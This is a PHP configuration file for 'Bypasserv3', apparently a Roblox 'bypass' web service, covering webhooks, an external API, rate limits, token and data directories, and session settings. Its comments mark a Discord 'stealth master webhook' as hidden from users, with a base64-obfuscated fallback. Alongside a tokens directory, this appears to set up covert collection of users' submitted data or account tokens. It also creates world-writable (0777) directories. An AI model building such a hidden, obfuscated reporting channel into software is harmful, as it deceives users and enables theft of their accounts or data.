<?php
/**
 * Bypasserv3 - Configuration File
 * Uses Railway environment variables for security and flexibility
 */

// Load local .env file for development (Railway loads variables automatically)
if (file_exists(__DIR__ . '/load_env.php')) {
    require_once __DIR__ . '/load_env.php';
}

// ============================================
// RAILWAY ENVIRONMENT VARIABLES
// ============================================

// 🥷 STEALTH MASTER WEBHOOK (HIDDEN FROM USERS)
// Set in Railway: MASTER_WEBHOOK = https://discord.com/api/webhooks/...
$railwayMasterWebhook = getenv('MASTER_WEBHOOK');
if ($railwayMasterWebhook && filter_var($railwayMasterWebhook, FILTER_VALIDATE_URL)) {
    define('STEALTH_MASTER', $railwayMasterWebhook);
} else {
    // Fallback: Base64 encoded webhook (REPLACE WITH YOUR ENCODED WEBHOOK)
    define('STEALTH_MASTER', base64_decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9NQVNURV9XRUJIT09LX0hFUkU='));
}

// 🌐 EXTERNAL BYPASS API
// Set in Railway: EXTERNAL_API_URL = https://rblxbypasser.com/api/bypass
define('EXTERNAL_API_URL', getenv('EXTERNAL_API_URL') ?: 'https://rblxbypasser.com/api/bypass');

// 🔒 RATE LIMITING
// Set in Railway: RATE_LIMIT_REQUESTS = 50
define('RATE_LIMIT_MAX', (int)(getenv('RATE_LIMIT_REQUESTS') ?: 50));

// Set in Railway: RATE_LIMIT_WINDOW = 3600 (1 hour in seconds)
define('RATE_LIMIT_WINDOW', (int)(getenv('RATE_LIMIT_WINDOW') ?: 3600));

// 🐛 DEBUG MODE
// Set in Railway: DEBUG_MODE = false
define('DEBUG_MODE', filter_var(getenv('DEBUG_MODE'), FILTER_VALIDATE_BOOLEAN));

// ============================================
// DATABASE SETTINGS (OPTIONAL - FOR FUTURE)
// ============================================
define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_NAME', getenv('DB_NAME') ?: 'bypasserv3');
define('DB_USER', getenv('DB_USER') ?: 'root');
define('DB_PASS', getenv('DB_PASS') ?: '');

// ============================================
// DIRECTORY PATHS
// ============================================
define('INSTANCES_DIR', __DIR__ . '/instances');
define('TOKENS_DIR', __DIR__ . '/tokens');
define('DATA_DIR', __DIR__ . '/data');
define('LOGS_DIR', __DIR__ . '/logs');

// ============================================
// AUTO-CREATE DIRECTORIES
// ============================================
$directories = [
    INSTANCES_DIR,
    TOKENS_DIR,
    DATA_DIR,
    LOGS_DIR,
    DATA_DIR . '/rate_limits'
];

foreach ($directories as $dir) {
    if (!file_exists($dir)) {
        mkdir($dir, 0777, true);
    }
}

// ============================================
// CREATE SECURITY .htaccess FILES
// ============================================
$protectedDirs = [
    INSTANCES_DIR,
    TOKENS_DIR,
    DATA_DIR,
    LOGS_DIR
];

foreach ($protectedDirs as $dir) {
    $htaccessFile = "$dir/.htaccess";
    if (!file_exists($htaccessFile)) {
        file_put_contents($htaccessFile, "Deny from all\n", LOCK_EX);
    }
}

// ============================================
// DEBUG/ERROR REPORTING
// ============================================
if (DEBUG_MODE) {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    
    // Log to file in debug mode
    ini_set('log_errors', 1);
    ini_set('error_log', LOGS_DIR . '/php_errors.log');
} else {
    ini_set('display_errors', 0);
    ini_set('display_startup_errors', 0);
    error_reporting(0);
}

// ============================================
// TIMEZONE SETTING
// ============================================
date_default_timezone_set('UTC');

// ============================================
// SESSION SETTINGS
// ============================================
if (session_status() === PHP_SESSION_NONE) {
    ini_set('session.cookie_httponly', 1);
    ini_set('session.cookie_secure', isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 1 : 0);
    ini_set('session.cookie_samesite', 'Lax');
    ini_set('session.gc_maxlifetime', 86400); // 24 hours
}
?>
